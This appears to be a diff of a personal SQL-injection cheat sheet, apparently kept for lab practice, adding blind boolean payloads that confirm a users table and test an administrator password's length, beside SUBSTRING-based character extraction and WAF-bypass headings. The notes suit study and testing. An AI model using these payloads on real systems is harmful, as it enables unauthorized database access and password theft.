@@ -333,7 +333,8 @@ Hacker                                                             website.thm  
     * if(condition, when_true, when_false)
   * `SUBSTRING(string, start, length)`
     * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
-  * `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
+  * Confirm table exists: `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
+  * Get length of password: `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
 * Bypass WAF
   * 對大小寫不敏感
   * 空白
